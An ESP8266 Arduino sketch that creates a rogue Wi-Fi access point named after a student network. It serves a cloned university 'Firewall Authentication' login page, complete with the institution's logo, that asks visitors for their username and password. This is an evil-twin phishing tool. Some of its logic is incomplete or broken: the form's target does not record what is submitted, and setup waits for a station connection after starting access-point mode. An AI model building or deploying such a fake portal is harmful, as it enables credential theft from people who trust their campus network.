#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>

#ifndef STASSID
#define STASSID "StudentWifi_2.4G"
#define STAPSK "wireless519"
#endif

const char* ssid = STASSID;
const char* password = STAPSK;

ESP8266WebServer server(80);

const int led = 13;
const char *htmlcode = R"===(
  <html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
      html,body{
        height:100%;
        padding:0;
        margin:0;
      }
      .oc{
        display:table;
        width:100%;
        height:100%;
      }
      .ic{
        display:table-cell;
        vertical-align:middle;
        height:100%;
      }
      form{
        display:block;
        background:#ccc;
        border:2px solid red;
        padding:0 0 25px 0;
        width:500px;
        font-family:helvetica,sans-serif;
        font-size:14px;
        margin:10px auto;
      }
      .fel,.fer,.fec{
        text-align:center;
        width:350px;
        margin:0 auto;
        padding:10px;
      }
      .fel{
        text-align:left;
      }
      .fer{
        text-align:right;
      }
      h1{
        font-weight:bold;
        font-size:21px;
        margin:0;
        padding:20px 10px;
        text-align:center;
      }
      p{
        margin:15px auto;
        width:75%;
        text-align:left;
      }
      ul{
        margin:15px auto;
        width:75%;
      }
      h2{
        margin:25px 10px;
        font-weight:bold;
        text-align:center;
      }
      label,h2{
        font-size:16px;
      }
      h3{
        
        margin:15px 10px;
        font-weight:normal;
        text-align:center;
        color: red;
      }
      .logo{
        background:#f8f6f7 center 25px url(http://cuims.in/uims/imgs/logo.jpg)no-repeat;
        padding-top:120px;
      }
    </style>
    <title>
      Firewall Authentication
    </title>
    <script async="" src="//www.google-analytics.com/analytics.js"></script><script>
      (function(i,s,o,g,r,a,m){
        i['GoogleAnalyticsObject']=r;
        i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)}
          ,i[r].l=1*new Date();
        a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];
        a.async=1;
        a.src=g;
        m.parentNode.insertBefore(a,m)
          }
      )(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      
      ga('create', 'UA-55121698-1', 'auto');
      ga('send', 'pageview');
      
    </script>
    <script>
    function RestrictSpace() {
    	if (event.keyCode == 32) {
        	return false;
    	}
	}
    </script>
  </head>
  <body>
    <div class="oc">
      <div class="ic">
        <form action="/" method="post">
          <input type="hidden" name="4Tredir" value="http://edge-http.microsoft.com/captiveportal/generate_204">
          <input type="hidden" name="magic" value="02367311e21192d5">
          <h1 class="logo">
            Authentication Required
          </h1>
          <h2>
            Please enter your username and password to continue.
          </h2>
          <h3>
            Please reset your password after 30 days
          </h3>
          <div class="fel">
            <label for="ft_un">
              Username:
            </label>
            
            <input name="username" onkeypress="return RestrictSpace()" id="ft_un" type="text" autocorrect="off" autocapitalize="off" style="width:230px">
            <br>
          </div>
          <div class="fel">
            <label for="ft_pd">
              Password:
            </label>
            
            <input name="password" id="ft_pd" type="password" autocomplete="off" style="width:230px">
          </div>
          <div class="fer">
            <input type="submit" value="Continue">
          </div>
        </form>
        
        <a href="ftp://172.16.3.112">
          
          
        </a>
      </div>
      
    </div>
  

</body></html>
)===";

void handleRoot() {
  digitalWrite(led, 1);
  server.send(200, "text/plain", "hello from esp8266!\r\n");
  digitalWrite(led, 0);
}

void handleNotFound() {
  digitalWrite(led, 1);
  String message = "File Not Found\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) { message += " " + server.argName(i) + ": " + server.arg(i) + "\n"; }
  server.send(200, "text/html", htmlcode);
  digitalWrite(led, 0);
}

void setup(void) {
  pinMode(led, OUTPUT);
  digitalWrite(led, 0);
  Serial.begin(115200);
  // WiFi.mode(WIFI_STA);
  // WiFi.begin(ssid, password);
  WiFi.softAP(ssid,password);
  Serial.println("");

  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());

  if (MDNS.begin("esp8266")) { Serial.println("MDNS responder started"); }

  server.on("/", handleRoot);

  server.on("/inline", []() {
    server.send(200, "text/plain", "this works as well");
  });

  server.on("/gif", []() {
    static const uint8_t gif[] PROGMEM = {
      0x47, 0x49, 0x46, 0x38, 0x37, 0x61, 0x10, 0x00, 0x10, 0x00, 0x80, 0x01,
      0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x2c, 0x00, 0x00, 0x00, 0x00,
      0x10, 0x00, 0x10, 0x00, 0x00, 0x02, 0x19, 0x8c, 0x8f, 0xa9, 0xcb, 0x9d,
      0x00, 0x5f, 0x74, 0xb4, 0x56, 0xb0, 0xb0, 0xd2, 0xf2, 0x35, 0x1e, 0x4c,
      0x0c, 0x24, 0x5a, 0xe6, 0x89, 0xa6, 0x4d, 0x01, 0x00, 0x3b
    };
    char gif_colored[sizeof(gif)];
    memcpy_P(gif_colored, gif, sizeof(gif));
    // Set the background to a random set of colors
    gif_colored[16] = millis() % 256;
    gif_colored[17] = millis() % 256;
    gif_colored[18] = millis() % 256;
    server.send(200, "image/gif", gif_colored, sizeof(gif_colored));
  });

  server.onNotFound(handleNotFound);

  /////////////////////////////////////////////////////////
  // Hook examples

  server.addHook([](const String& method, const String& url, WiFiClient* client, ESP8266WebServer::ContentTypeFunction contentType) {
    (void)method;       // GET, PUT, ...
    (void)url;          // example: /root/myfile.html
    (void)client;       // the webserver tcp client connection
    (void)contentType;  // contentType(".html") => "text/html"
    Serial.printf("A useless web hook has passed\n");
    Serial.printf("(this hook is in 0x%08x area (401x=IRAM 402x=FLASH))\n", esp_get_program_counter());
    return ESP8266WebServer::CLIENT_REQUEST_CAN_CONTINUE;
  });

  server.addHook([](const String&, const String& url, WiFiClient*, ESP8266WebServer::ContentTypeFunction) {
    if (url.startsWith("/fail")) {
      Serial.printf("An always failing web hook has been triggered\n");
      return ESP8266WebServer::CLIENT_MUST_STOP;
    }
    return ESP8266WebServer::CLIENT_REQUEST_CAN_CONTINUE;
  });

  server.addHook([](const String&, const String& url, WiFiClient* client, ESP8266WebServer::ContentTypeFunction) {
    if (url.startsWith("/dump")) {
      Serial.printf("The dumper web hook is on the run\n");

      // Here the request is not interpreted, so we cannot for sure
      // swallow the exact amount matching the full request+content,
      // hence the tcp connection cannot be handled anymore by the
      // webserver.
#ifdef STREAMSEND_API
      // we are lucky
      client->sendAll(Serial, 500);
#else
      auto last = millis();
      while ((millis() - last) < 500) {
        char buf[32];
        size_t len = client->read((uint8_t*)buf, sizeof(buf));
        if (len > 0) {
          Serial.printf("(<%d> chars)", (int)len);
          Serial.write(buf, len);
          last = millis();
        }
      }
#endif
      // Two choices: return MUST STOP and webserver will close it
      //                       (we already have the example with '/fail' hook)
      // or                  IS GIVEN and webserver will forget it
      // trying with IS GIVEN and storing it on a dumb WiFiClient.
      // check the client connection: it should not immediately be closed
      // (make another '/dump' one to close the first)
      Serial.printf("\nTelling server to forget this connection\n");
      static WiFiClient forgetme = *client;  // stop previous one if present and transfer client refcounter
      return ESP8266WebServer::CLIENT_IS_GIVEN;
    }
    return ESP8266WebServer::CLIENT_REQUEST_CAN_CONTINUE;
  });

  // Hook examples
  /////////////////////////////////////////////////////////

  server.begin();
  Serial.println("HTTP server started");
}

void loop(void) {
  server.handleClient();
  MDNS.update();
}
